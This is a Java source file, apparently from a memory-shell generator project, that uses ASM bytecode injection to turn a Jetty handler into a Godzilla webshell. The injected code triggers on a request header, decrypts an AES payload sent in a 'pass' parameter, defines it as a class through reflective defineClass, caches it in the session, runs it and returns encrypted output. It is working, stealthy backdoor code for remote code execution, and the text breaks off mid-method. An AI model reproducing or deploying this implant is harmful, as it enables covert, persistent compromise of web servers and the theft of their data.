package com.reajason.javaweb.memshell.shelltool.godzilla.jetty;

import org.objectweb.asm.Label;
import org.objectweb.asm.MethodVisitor;
import org.objectweb.asm.Opcodes;
import org.objectweb.asm.Type;

public class GodzillaHandlerAsmMethodVisitor extends MethodVisitor {

    Type[] argTypes;

    public GodzillaHandlerAsmMethodVisitor(MethodVisitor mv, Type[] argTypes) {
        super(Opcodes.ASM9, mv);
        this.argTypes = argTypes;
    }

    @Override
    public void visitCode() {
        super.visitCode();

        int startIndex = 1;
        for (Type type : argTypes) {
            startIndex += type.getSize();
        }

        int keyIndex = startIndex;
        int passIndex = startIndex + 1;
        int md5Index = startIndex + 2;
        int headerNameIndex = startIndex + 3;
        int headerValueIndex = startIndex + 4;
        int curHeaderIndex = startIndex + 5;
        int curParameterIndex = startIndex + 6;
        int dataIndex = startIndex + 7;
        int base64ClassIndex = startIndex + 8;
        int decoderClassIndex = startIndex + 9;
        int base64ExceptionIndex = startIndex + 10;
        int cipherClassIndex = startIndex + 11;
        int secretKeySpecClassIndex = startIndex + 12;
        int keyClassIndex = startIndex + 13;
        int cipherInitMethodIndex = startIndex + 14;
        int doFinalMethodIndex = startIndex + 15;
        int cipherIndex = startIndex + 16;
        int secretKeySpecIndex = startIndex + 17;
        int sessionIndex = startIndex + 18;
        int sessionPayloadIndex = startIndex + 19;
        int defineClassIndex = startIndex + 20;
        int payloadClassIndex = startIndex + 21;
        int arrOutIndex = startIndex + 22;
        int instanceIndex = startIndex + 23;
        int writerIndex = startIndex + 24;
        int encryptBytesIndex = startIndex + 25;
        int encoderClassIndex = startIndex + 26;
        int resultIndex = startIndex + 27;
        int base64EncodeExceptionIndex = startIndex + 28;

        int outerExceptionIndex = startIndex + 26;

        // Access method arguments - adjust based on whether method is static or not
        int baseRequestIndex = 2;  // Arg index 1
        int requestIndex = 3;      // Arg index 2
        int responseIndex = 4;     // Arg index 3

        // Define constants
        mv.visitLdcInsn("key");
        mv.visitVarInsn(Opcodes.ASTORE, keyIndex);
        mv.visitLdcInsn("pass");
        mv.visitVarInsn(Opcodes.ASTORE, passIndex);
        mv.visitLdcInsn("md5");
        mv.visitVarInsn(Opcodes.ASTORE, md5Index);
        mv.visitLdcInsn("headerName");
        mv.visitVarInsn(Opcodes.ASTORE, headerNameIndex);
        mv.visitLdcInsn("headerValue");
        mv.visitVarInsn(Opcodes.ASTORE, headerValueIndex);

        // Define labels for try-catch
        Label tryStart = new Label();
        Label tryEnd = new Label();
        Label catchHandler = new Label();

        // Register try-catch block
        mv.visitTryCatchBlock(tryStart, tryEnd, catchHandler, "java/lang/Exception");

        // Start of try block
        mv.visitLabel(tryStart);

        getHeaderValue(requestIndex, headerNameIndex, curHeaderIndex);

        // if (value != null && value.contains(headerValue))
        mv.visitVarInsn(Opcodes.ALOAD, curHeaderIndex); // Load value
        Label ifNullLabel = new Label();
        mv.visitJumpInsn(Opcodes.IFNULL, ifNullLabel);

        mv.visitVarInsn(Opcodes.ALOAD, curHeaderIndex); // Load value
        mv.visitVarInsn(Opcodes.ALOAD, headerValueIndex); // Load headerValue
        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/String", "contains",
                "(Ljava/lang/CharSequence;)Z", false);
        mv.visitJumpInsn(Opcodes.IFEQ, ifNullLabel);

        // Set baseRequest.setHandled(true)
        mv.visitVarInsn(Opcodes.ALOAD, baseRequestIndex);
        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/Object", "getClass", "()Ljava/lang/Class;", false);
        mv.visitLdcInsn("setHandled");
        mv.visitInsn(Opcodes.ICONST_1);
        mv.visitTypeInsn(Opcodes.ANEWARRAY, "java/lang/Class");
        mv.visitInsn(Opcodes.DUP);
        mv.visitInsn(Opcodes.ICONST_0);
        mv.visitFieldInsn(Opcodes.GETSTATIC, "java/lang/Boolean", "TYPE", "Ljava/lang/Class;");
        mv.visitInsn(Opcodes.AASTORE);
        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/Class", "getMethod", "(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;", false);
        mv.visitVarInsn(Opcodes.ALOAD, baseRequestIndex);
        mv.visitInsn(Opcodes.ICONST_1);
        mv.visitTypeInsn(Opcodes.ANEWARRAY, "java/lang/Object");
        mv.visitInsn(Opcodes.DUP);
        mv.visitInsn(Opcodes.ICONST_0);
        mv.visitInsn(Opcodes.ICONST_1);
        mv.visitMethodInsn(Opcodes.INVOKESTATIC, "java/lang/Boolean", "valueOf", "(Z)Ljava/lang/Boolean;", false);
        mv.visitInsn(Opcodes.AASTORE);
        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/reflect/Method", "invoke", "(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;", false);
        mv.visitInsn(Opcodes.POP);

        getParameterValue(requestIndex, passIndex, curParameterIndex);

        // Declare data variable
        mv.visitInsn(Opcodes.ACONST_NULL);
        mv.visitVarInsn(Opcodes.ASTORE, dataIndex); // Store null in data (local var 10)

        tryDecodeBase64(base64ClassIndex, decoderClassIndex, curParameterIndex, dataIndex, base64ExceptionIndex);

        decryptData(cipherClassIndex, secretKeySpecClassIndex, keyClassIndex, cipherInitMethodIndex, doFinalMethodIndex, cipherIndex, keyIndex, secretKeySpecIndex, dataIndex);

        getSessionPayload(requestIndex, sessionIndex, sessionPayloadIndex);

        // if (sessionPayload == null)
        mv.visitVarInsn(Opcodes.ALOAD, sessionPayloadIndex); // Load sessionPayload
        Label sessionPayloadNotNull = new Label();
        mv.visitJumpInsn(Opcodes.IFNONNULL, sessionPayloadNotNull);

        defineClassWhenFirstInvoke(defineClassIndex, dataIndex, payloadClassIndex, sessionIndex);

        // Else branch - sessionPayload is not null
        mv.visitLabel(sessionPayloadNotNull);

        // request.getClass().getMethod("setAttribute", String.class, Object.class)
        // .invoke(request, "parameters", data);
        mv.visitVarInsn(Opcodes.ALOAD, requestIndex); // Load request
        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/Object", "getClass",
                "()Ljava/lang/Class;", false);
        mv.visitLdcInsn("setAttribute");
        mv.visitInsn(Opcodes.ICONST_2);
        mv.visitTypeInsn(Opcodes.ANEWARRAY, "java/lang/Class");
        mv.visitInsn(Opcodes.DUP);
        mv.visitInsn(Opcodes.ICONST_0);
        mv.visitLdcInsn(Type.getType("Ljava/lang/String;"));
        mv.visitInsn(Opcodes.AASTORE);
        mv.visitInsn(Opcodes.DUP);
        mv.visitInsn(Opcodes.ICONST_1);
        mv.visitLdcInsn(Type.getType("Ljava/lang/Object;"));
        mv.visitInsn(Opcodes.AASTORE);
        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/Class", "getMethod",
                "(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;", false);
        mv.visitVarInsn(Opcodes.ALOAD, requestIndex); // Load request
        mv.visitInsn(Opcodes.ICONST_2);
        mv.visitTypeInsn(Opcodes.ANEWARRAY, "java/lang/Object");
        mv.visitInsn(Opcodes.DUP);
        mv.visitInsn(Opcodes.ICONST_0);
        mv.visitLdcInsn("parameters");
        mv.visitInsn(Opcodes.AASTORE);
        mv.visitInsn(Opcodes.DUP);
        mv.visitInsn(Opcodes.ICONST_1);
        mv.visitVarInsn(Opcodes.ALOAD, dataIndex); // Load data
        mv.visitInsn(Opcodes.AASTORE);
        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/reflect/Method",
                "invoke",
                "(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;", false);
        mv.visitInsn(Opcodes.POP);

        // ByteArrayOutputStream arrOut = new ByteArrayOutputStream();
        mv.visitTypeInsn(Opcodes.NEW, "java/io/ByteArrayOutputStream");
        mv.visitInsn(Opcodes.DUP);
        mv.visitMethodInsn(Opcodes.INVOKESPECIAL, "java/io/ByteArrayOutputStream",
                "<init>", "()V", false);
        mv.visitVarInsn(Opcodes.ASTORE, arrOutIndex); // Store arrOut in local var 25

        // Object f = ((Class<?>) sessionPayload).newInstance();
        mv.visitVarInsn(Opcodes.ALOAD, sessionPayloadIndex); // Load sessionPayload
        mv.visitTypeInsn(Opcodes.CHECKCAST, "java/lang/Class");
        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/Class", "newInstance",
                "()Ljava/lang/Object;", false);
        mv.visitVarInsn(Opcodes.ASTORE, instanceIndex); // Store f in local var 26

        // f.equals(arrOut);
        mv.visitVarInsn(Opcodes.ALOAD, instanceIndex); // Load f
        mv.visitVarInsn(Opcodes.ALOAD, arrOutIndex); // Load arrOut
        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/Object", "equals",
                "(Ljava/lang/Object;)Z", false);
        mv.visitInsn(Opcodes.POP); // Discard result

        // f.equals(request);
        mv.visitVarInsn(Opcodes.ALOAD, instanceIndex); // Load f
        mv.visitVarInsn(Opcodes.ALOAD, requestIndex); // Load request
        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/Object", "equals",
                "(Ljava/lang/Object;)Z", false);
        mv.visitInsn(Opcodes.POP); // Discard result

        // PrintWriter writer = (PrintWriter)
        // response.getClass().getMethod("getWriter").invoke(response);
        mv.visitVarInsn(Opcodes.ALOAD, responseIndex); // Load response
        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/Object", "getClass",
                "()Ljava/lang/Class;", false);
        mv.visitLdcInsn("getWriter");
        mv.visitInsn(Opcodes.ICONST_0);
        mv.visitTypeInsn(Opcodes.ANEWARRAY, "java/lang/Class");
        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/Class", "getMethod",
                "(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;", false);
        mv.visitVarInsn(Opcodes.ALOAD, responseIndex); // Load response
        mv.visitInsn(Opcodes.ICONST_0);
        mv.visitTypeInsn(Opcodes.ANEWARRAY, "java/lang/Object");
        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/reflect/Method",
                "invoke",
                "(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;", false);
        mv.visitTypeInsn(Opcodes.CHECKCAST, "java/io/PrintWriter");
        mv.visitVarInsn(Opcodes.ASTORE, writerIndex); // Store writer in local var 27

        // writer.write(md5.substring(0, 16));
        mv.visitVarInsn(Opcodes.ALOAD, writerIndex); // Load writer
        mv.visitVarInsn(Opcodes.ALOAD, md5Index); // Load md5
        mv.visitInsn(Opcodes.ICONST_0);
        mv.visitIntInsn(Opcodes.BIPUSH, 16);
        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/String", "substring",
                "(II)Ljava/lang/String;", false);
        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/io/PrintWriter", "write",
                "(Ljava/lang/String;)V", false);

        // f.toString();
        mv.visitVarInsn(Opcodes.ALOAD, instanceIndex); // Load f
        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/Object", "toString",
                "()Ljava/lang/String;", false);
        mv.visitInsn(Opcodes.POP); // Discard result

        // Re-initialize cipher for encryption
        // cipherInitMethod.invoke(cipher, 1, secretKeySpec);
        mv.visitVarInsn(Opcodes.ALOAD, cipherInitMethodIndex); // Load cipherInitMethod
        mv.visitVarInsn(Opcodes.ALOAD, cipherIndex); // Load cipher
        mv.visitInsn(Opcodes.ICONST_2);
        mv.visitTypeInsn(Opcodes.ANEWARRAY, "java/lang/Object");
        mv.visitInsn(Opcodes.DUP);
        mv.visitInsn(Opcodes.ICONST_0);
        mv.visitInsn(Opcodes.ICONST_1); // Constant 1 for Cipher.ENCRYPT_MODE
        mv.visitMethodInsn(Opcodes.INVOKESTATIC, "java/lang/Integer", "valueOf",
                "(I)Ljava/lang/Integer;", false);
        mv.visitInsn(Opcodes.AASTORE);
        mv.visitInsn(Opcodes.DUP);
        mv.visitInsn(Opcodes.ICONST_1);
        mv.visitVarInsn(Opcodes.ALOAD, secretKeySpecIndex); // Load secretKeySpec
        mv.visitInsn(Opcodes.AASTORE);
        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/reflect/Method",
                "invoke",
                "(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;", false);
        mv.visitInsn(Opcodes.POP);

        // byte[] encryptBytes = (byte[]) doFinalMethod.invoke(cipher,
        // arrOut.toByteArray());
        mv.visitVarInsn(Opcodes.ALOAD, doFinalMethodIndex); // Load doFinalMethod
        mv.visitVarInsn(Opcodes.ALOAD, cipherIndex); // Load cipher
        mv.visitInsn(Opcodes.ICONST_1);
        mv.visitTypeInsn(Opcodes.ANEWARRAY, "java/lang/Object");
        mv.visitInsn(Opcodes.DUP);
        mv.visitInsn(Opcodes.ICONST_0);
        mv.visitVarInsn(Opcodes.ALOAD, arrOutIndex); // Load arrOut
        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/io/ByteArrayOutputStream",
                "toByteArray", "()[B", false);
        mv.visitInsn(Opcodes.AASTORE);
        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/reflect/Method",
                "invoke",
                "(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;", false);
        mv.visitTypeInsn(Opcodes.CHECKCAST, "[B");
        mv.visitVarInsn(Opcodes.ASTORE, encryptBytesIndex); // Store encryptBytes in local var 28

        tryEncodeBase64(base64ClassIndex, encoderClassIndex, encryptBytesIndex, resultIndex, base64EncodeExceptionIndex);

        // writer.write(result);
        mv.visitVarInsn(Opcodes.ALOAD, writerIndex); // Load writer
        mv.visitVarInsn(Opcodes.ALOAD, resultIndex); // Load result
        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/io/PrintWriter", "write",
                "(Ljava/lang/String;)V", false);

        // writer.write(md5.substring(16));
        mv.visitVarInsn(Opcodes.ALOAD, writerIndex); // Load writer
        mv.visitVarInsn(Opcodes.ALOAD, md5Index); // Load md5
        mv.visitIntInsn(Opcodes.BIPUSH, 16);
        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/String", "substring",
                "(I)Ljava/lang/String;", false);
        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/io/PrintWriter", "write",
                "(Ljava/lang/String;)V", false);

        // Return from the method without calling original doFilter
        mv.visitInsn(Opcodes.RETURN);

        // Label for when header value doesn't match
        mv.visitLabel(ifNullLabel);

        // End of try block
        mv.visitLabel(tryEnd);

        // Skip catch block if we didn't enter it
        Label afterCatch = new Label();
        mv.visitJumpInsn(Opcodes.GOTO, afterCatch);

        // Start of catch block
        mv.visitLabel(catchHandler);
        // The exception is now on the stack
        mv.visitVarInsn(Opcodes.ASTORE, outerExceptionIndex); // Store exception in local var 10 and discard it
        mv.visitVarInsn(Opcodes.ALOAD, outerExceptionIndex);
        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/Exception", "printStackTrace", "()V", false);
        // End of catch block
        mv.visitLabel(afterCatch);
    }

    private void tryEncodeBase64(int base64ClassIndex, int encoderClassIndex, int encryptBytesIndex, int resultIndex, int base64EncodeExceptionIndex) {
        // Encoding encrypted bytes with Base64
        // Try first with java.util.Base64
        Label base64EncodeTrialStart = new Label();
        Label base64EncodeCatch = new Label();
        Label afterBase64Encode = new Label();

        mv.visitTryCatchBlock(base64EncodeTrialStart, afterBase64Encode, base64EncodeCatch, "java/lang/Throwable");

        mv.visitLabel(base64EncodeTrialStart);

        // base64 = Class.forName("java.util.Base64");
        mv.visitLdcInsn("java.util.Base64");
        mv.visitMethodInsn(Opcodes.INVOKESTATIC, "java/lang/Class", "forName",
                "(Ljava/lang/String;)Ljava/lang/Class;",
                false);
        mv.visitVarInsn(Opcodes.ASTORE, base64ClassIndex); // Store base64 class in local var 29

        // Object encoder = base64.getMethod("getEncoder").invoke(base64);
        mv.visitVarInsn(Opcodes.ALOAD, base64ClassIndex); // Load base64 class
        mv.visitLdcInsn("getEncoder");
        mv.visitInsn(Opcodes.ICONST_0);
        mv.visitTypeInsn(Opcodes.ANEWARRAY, "java/lang/Class");
        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/Class", "getMethod",
                "(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;", false);
        mv.visitVarInsn(Opcodes.ALOAD, base64ClassIndex); // Load base64 class
        mv.visitInsn(Opcodes.ICONST_0);
        mv.visitTypeInsn(Opcodes.ANEWARRAY, "java/lang/Object");
        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/reflect/Method",
                "invoke",
                "(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;", false);
        mv.visitVarInsn(Opcodes.ASTORE, encoderClassIndex); // Store encoder in local var 30

        // result = (String) encoder.getClass().getMethod("encodeToString",
        // byte[].class).invoke(encoder, encryptBytes);
        mv.visitVarInsn(Opcodes.ALOAD, encoderClassIndex); // Load encoder
        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/Object", "getClass",
                "()Ljava/lang/Class;", false);
        mv.visitLdcInsn("encodeToString");
        mv.visitInsn(Opcodes.ICONST_1);
        mv.visitTypeInsn(Opcodes.ANEWARRAY, "java/lang/Class");
        mv.visitInsn(Opcodes.DUP);
        mv.visitInsn(Opcodes.ICONST_0);
        mv.visitLdcInsn(Type.getType("[B"));
        mv.visitInsn(Opcodes.AASTORE);
        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/Class", "getMethod",
                "(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;", false);
        mv.visitVarInsn(Opcodes.ALOAD, encoderClassIndex); // Load encoder
        mv.visitInsn(Opcodes.ICONST_1);
        mv.visitTypeInsn(Opcodes.ANEWARRAY, "java/lang/Object");
        mv.visitInsn(Opcodes.DUP);
        mv.visitInsn(Opcodes.ICONST_0);
        mv.visitVarInsn(Opcodes.ALOAD, encryptBytesIndex); // Load encryptBytes
        mv.visitInsn(Opcodes.AASTORE);
        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/reflect/Method",
                "invoke",
                "(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;", false);
        mv.visitTypeInsn(Opcodes.CHECKCAST, "java/lang/String");
        mv.visitVarInsn(Opcodes.ASTORE, resultIndex); // Store result in local var 31

        mv.visitJumpInsn(Opcodes.GOTO, afterBase64Encode);

        // Fallback to sun.misc.BASE64Encoder
        mv.visitLabel(base64EncodeCatch);
        mv.visitVarInsn(Opcodes.ASTORE, base64EncodeExceptionIndex); // Store exception in local var 32

        // base64 = Class.forName("sun.misc.BASE64Encoder");
        mv.visitLdcInsn("sun.misc.BASE64Encoder");
        mv.visitMethodInsn(Opcodes.INVOKESTATIC, "java/lang/Class", "forName",
                "(Ljava/lang/String;)Ljava/lang/Class;",
                false);
        mv.visitVarInsn(Opcodes.ASTORE, base64ClassIndex); // Store base64 class in local var 29

        // Object encoder = base64.newInstance();
        mv.visitVarInsn(Opcodes.ALOAD, base64ClassIndex); // Load base64 class
        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/Class", "newInstance",
                "()Ljava/lang/Object;", false);
        mv.visitVarInsn(Opcodes.ASTORE, encoderClassIndex); // Store encoder in local var 30

        // result = (String) encoder.getClass().getMethod("encode",
        // byte[].class).invoke(encoder, encryptBytes);
        mv.visitVarInsn(Opcodes.ALOAD, encoderClassIndex); // Load encoder
        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/Object", "getClass",
                "()Ljava/lang/Class;", false);
        mv.visitLdcInsn("encode");
        mv.visitInsn(Opcodes.ICONST_1);
        mv.visitTypeInsn(Opcodes.ANEWARRAY, "java/lang/Class");
        mv.visitInsn(Opcodes.DUP);
        mv.visitInsn(Opcodes.ICONST_0);
        mv.visitLdcInsn(Type.getType("[B"));
        mv.visitInsn(Opcodes.AASTORE);
        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/Class", "getMethod",
                "(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;", false);
        mv.visitVarInsn(Opcodes.ALOAD, encoderClassIndex); // Load encoder
        mv.visitInsn(Opcodes.ICONST_1);
        mv.visitTypeInsn(Opcodes.ANEWARRAY, "java/lang/Object");
        mv.visitInsn(Opcodes.DUP);
        mv.visitInsn(Opcodes.ICONST_0);
        mv.visitVarInsn(Opcodes.ALOAD, encryptBytesIndex); // Load encryptBytes
        mv.visitInsn(Opcodes.AASTORE);
        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/reflect/Method",
                "invoke",
                "(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;", false);
        mv.visitTypeInsn(Opcodes.CHECKCAST, "java/lang/String");
        mv.visitVarInsn(Opcodes.ASTORE, resultIndex); // Store result in local var 31

        mv.visitLabel(afterBase64Encode);
    }

    private void defineClassWhenFirstInvoke(int defineClassIndex, int dataIndex, int payloadClassIndex, int sessionIndex) {
        // Define class from bytes
        // Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass",
        // byte[].class, int.class, int.class);
        mv.visitLdcInsn(Type.getType("Ljava/lang/ClassLoader;"));
        mv.visitLdcInsn("defineClass");
        mv.visitInsn(Opcodes.ICONST_3);
        mv.visitTypeInsn(Opcodes.ANEWARRAY, "java/lang/Class");
        mv.visitInsn(Opcodes.DUP);
        mv.visitInsn(Opcodes.ICONST_0);
        mv.visitLdcInsn(Type.getType("[B"));
        mv.visitInsn(Opcodes.AASTORE);
        mv.visitInsn(Opcodes.DUP);
        mv.visitInsn(Opcodes.ICONST_1);
        mv.visitFieldInsn(Opcodes.GETSTATIC, "java/lang/Integer", "TYPE",
                "Ljava/lang/Class;");
        mv.visitInsn(Opcodes.AASTORE);
        mv.visitInsn(Opcodes.DUP);
        mv.visitInsn(Opcodes.ICONST_2);
        mv.visitFieldInsn(Opcodes.GETSTATIC, "java/lang/Integer", "TYPE",
                "Ljava/lang/Class;");
        mv.visitInsn(Opcodes.AASTORE);
        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/Class",
                "getDeclaredMethod",
                "(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;", false);
        mv.visitVarInsn(Opcodes.ASTORE, defineClassIndex); // Store defineClass in local var 23

        // defineClass.setAccessible(true);
        mv.visitVarInsn(Opcodes.ALOAD, defineClassIndex); // Load defineClass
        mv.visitInsn(Opcodes.ICONST_1);
        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/reflect/Method",
                "setAccessible", "(Z)V", false);

        // Class<?> payload = (Class<?>)
        // defineClass.invoke(Thread.currentThread().getContextClassLoader(),
        // data, 0, data.length);
        mv.visitVarInsn(Opcodes.ALOAD, defineClassIndex); // Load defineClass
        mv.visitMethodInsn(Opcodes.INVOKESTATIC, "java/lang/Thread", "currentThread",
                "()Ljava/lang/Thread;", false);
        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/Thread",
                "getContextClassLoader",
                "()Ljava/lang/ClassLoader;", false);
        mv.visitInsn(Opcodes.ICONST_3);
        mv.visitTypeInsn(Opcodes.ANEWARRAY, "java/lang/Object");
        mv.visitInsn(Opcodes.DUP);
        mv.visitInsn(Opcodes.ICONST_0);
        mv.visitVarInsn(Opcodes.ALOAD, dataIndex); // Load data
        mv.visitInsn(Opcodes.AASTORE);
        mv.visitInsn(Opcodes.DUP);
        mv.visitInsn(Opcodes.ICONST_1);
        mv.visitInsn(Opcodes.ICONST_0);
        mv.visitMethodInsn(Opcodes.INVOKESTATIC, "java/lang/Integer", "valueOf",
                "(I)Ljava/lang/Integer;", false);
        mv.visitInsn(Opcodes.AASTORE);
        mv.visitInsn(Opcodes.DUP);
        mv.visitInsn(Opcodes.ICONST_2);
        mv.visitVarInsn(Opcodes.ALOAD, dataIndex); // Load data
        mv.visitInsn(Opcodes.ARRAYLENGTH);
        mv.visitMethodInsn(Opcodes.INVOKESTATIC, "java/lang/Integer", "valueOf",
                "(I)Ljava/lang/Integer;", false);
        mv.visitInsn(Opcodes.AASTORE);
        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/reflect/Method",
                "invoke",
                "(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;", false);
        mv.visitVarInsn(Opcodes.ASTORE, payloadClassIndex); // Store payload class in local var 24

        // session.getClass().getMethod("setAttribute", String.class, Object.class)
        // .invoke(session, "payload", payload);
        mv.visitVarInsn(Opcodes.ALOAD, sessionIndex); // Load session
        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/Object", "getClass",
                "()Ljava/lang/Class;", false);
        mv.visitLdcInsn("setAttribute");
        mv.visitInsn(Opcodes.ICONST_2);
        mv.visitTypeInsn(Opcodes.ANEWARRAY, "java/lang/Class");
        mv.visitInsn(Opcodes.DUP);
        mv.visitInsn(Opcodes.ICONST_0);
        mv.visitLdcInsn(Type.getType("Ljava/lang/String;"));
        mv.visitInsn(Opcodes.AASTORE);
        mv.visitInsn(Opcodes.DUP);
        mv.visitInsn(Opcodes.ICONST_1);
        mv.visitLdcInsn(Type.getType("Ljava/lang/Object;"));
        mv.visitInsn(Opcodes.AASTORE);
        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/Class", "getMethod",
                "(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;", false);
        mv.visitVarInsn(Opcodes.ALOAD, sessionIndex); // Load session
        mv.visitInsn(Opcodes.ICONST_2);
        mv.visitTypeInsn(Opcodes.ANEWARRAY, "java/lang/Object");
        mv.visitInsn(Opcodes.DUP);
        mv.visitInsn(Opcodes.ICONST_0);
        mv.visitLdcInsn("payload");
        mv.visitInsn(Opcodes.AASTORE);
        mv.visitInsn(Opcodes.DUP);
        mv.visitInsn(Opcodes.ICONST_1);
        mv.visitVarInsn(Opcodes.ALOAD, payloadClassIndex); // Load payload class
        mv.visitInsn(Opcodes.AASTORE);
        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/reflect/Method",
                "invoke",
                "(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;", false);
        mv.visitInsn(Opcodes.POP);

        // If first-time class loading - return true
        mv.visitInsn(Opcodes.RETURN);
    }

    private void getSessionPayload(int requestIndex, int sessionIndex, int sessionPayloadIndex) {
        // Get session
        // Object session =
        // request.getClass().getMethod("getSession").invoke(request);
        mv.visitVarInsn(Opcodes.ALOAD, requestIndex); // Load request
        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/Object", "getClass",
                "()Ljava/lang/Class;", false);
        mv.visitLdcInsn("getSession");
        mv.visitInsn(Opcodes.ICONST_0);
        mv.visitTypeInsn(Opcodes.ANEWARRAY, "java/lang/Class");
        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/Class", "getMethod",
                "(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;", false);
        mv.visitVarInsn(Opcodes.ALOAD, requestIndex); // Load request
        mv.visitInsn(Opcodes.ICONST_0);
        mv.visitTypeInsn(Opcodes.ANEWARRAY, "java/lang/Object");
        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/reflect/Method",
                "invoke",
                "(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;", false);
        mv.visitVarInsn(Opcodes.ASTORE, sessionIndex); // Store session in local var 21

        // Get sessionPayload
        // Object sessionPayload = session.getClass().getMethod("getAttribute",
        // String.class)
        // .invoke(session, "payload");
        mv.visitVarInsn(Opcodes.ALOAD, sessionIndex); // Load session
        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/Object", "getClass",
                "()Ljava/lang/Class;", false);
        mv.visitLdcInsn("getAttribute");
        mv.visitInsn(Opcodes.ICONST_1);
        mv.visitTypeInsn(Opcodes.ANEWARRAY, "java/lang/Class");
        mv.visitInsn(Opcodes.DUP);
        mv.visitInsn(Opcodes.ICONST_0);
        mv.visitLdcInsn(Type.getType("Ljava/lang/String;"));
        mv.visitInsn(Opcodes.AASTORE);
        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/Class", "getMethod",
                "(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;", false);
        mv.visitVarInsn(Opcodes.ALOAD, sessionIndex); // Load session
        mv.visitInsn(Opcodes.ICONST_1);
        mv.visitTypeInsn(Opcodes.ANEWARRAY, "java/lang/Object");
        mv.visitInsn(Opcodes.DUP);
        mv.visitInsn(Opcodes.ICONST_0);
        mv.visitLdcInsn("payload");
        mv.visitInsn(Opcodes.AASTORE);
        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/reflect/Method",
                "invoke",
                "(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;", false);
        mv.visitVarInsn(Opcodes.ASTORE, sessionPayloadIndex); // Store sessionPayload in local var 22
    }

    private void decryptData(int cipherClassIndex, int secretKeySpecClassIndex, int keyClassIndex, int cipherInitMethodIndex, int doFinalMethodIndex, int cipherIndex, int keyIndex, int secretKeySpecIndex, int dataIndex) {
        // Load crypto classes
        // Class<?> cipherClass = Class.forName("javax.crypto.Cipher"...
        mv.visitLdcInsn("javax.crypto.Cipher");
        mv.visitInsn(Opcodes.ICONST_1);
        mv.visitMethodInsn(Opcodes.INVOKESTATIC, "java/lang/Thread", "currentThread", "()Ljava/lang/Thread;", false);
        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/Thread", "getContextClassLoader",
